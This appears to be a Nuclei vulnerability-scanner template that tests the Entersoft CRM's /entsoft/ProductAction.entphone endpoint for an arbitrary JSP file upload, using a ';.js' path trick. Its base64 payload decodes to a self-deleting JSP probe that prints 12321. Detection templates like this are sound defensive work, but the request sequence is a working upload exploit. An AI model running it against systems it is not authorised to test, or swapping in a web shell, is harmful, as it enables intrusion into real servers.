id: entersoft-productaction-entphone-fileupload
info:
  name: 浙大恩特客户资源管理系统 /entsoft/ProductAction.entphone 接口任意文件上传
  author: SleepingBag945
  severity: critical

variables:
  filename: "{{to_lower(rand_base(5))}}"
  foldername: "{{rand_int(5)}}"  
  content: "PCVvdXQucHJpbnQoMTExKjExMSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg=="

  
http:
  - raw:
      - |-
        POST /entsoft/ProductAction.entphone;.js?method=saveFileByPhone&goonum={{foldername}}&filename={{filename}}.jsp&imageData={{content}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
        Content-Length: 4
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cache-Control: max-age=0
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1

        test
      - |+
        GET /entsoft/image/goocodimg/goodoc/{{foldername}}/{{filename}}.jsp;.js HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
        Content-Length: 0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cache-Control: max-age=0
        Connection: close
        Upgrade-Insecure-Requests: 1


    matchers:
      - type: dsl
        condition: and
        dsl:
          - status_code_1==200
          - "contains(body_2, '12321') && status_code_2==200"